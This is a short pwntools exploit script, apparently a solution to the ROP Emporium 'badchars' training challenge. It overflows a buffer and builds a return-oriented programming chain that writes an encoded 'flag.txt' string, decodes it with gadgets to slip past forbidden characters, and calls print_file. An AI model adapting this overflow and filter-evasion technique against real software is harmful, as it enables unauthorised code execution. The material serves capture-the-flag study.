from pwn import *
context.log_level = 'debug'

io = process('./badchars')
elf = ELF('./badchars')

xor_r14r15 = 0x400628
add_r14r15 = 0x40062c
sub_r14r15 = 0x400630
mov_r12r13 = 0x400634
pop_r12r13r14r15 = 0x40069c
pop_r14r15 = 0x4006a0
pop_rdi = 0x4006a3
write_addr = 0x601030

badchars = 'xga.'

payload = b'b' * 40
payload += p64(pop_r12r13r14r15) + b'flbh/tyt' + p64(write_addr) + p64(1) + p64(write_addr + 2)
payload += p64(mov_r12r13)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)
payload += p64(sub_r14r15)
payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)
payload += p64(sub_r14r15)
payload += p64(pop_rdi) + p64(write_addr)
payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)

io.interactive()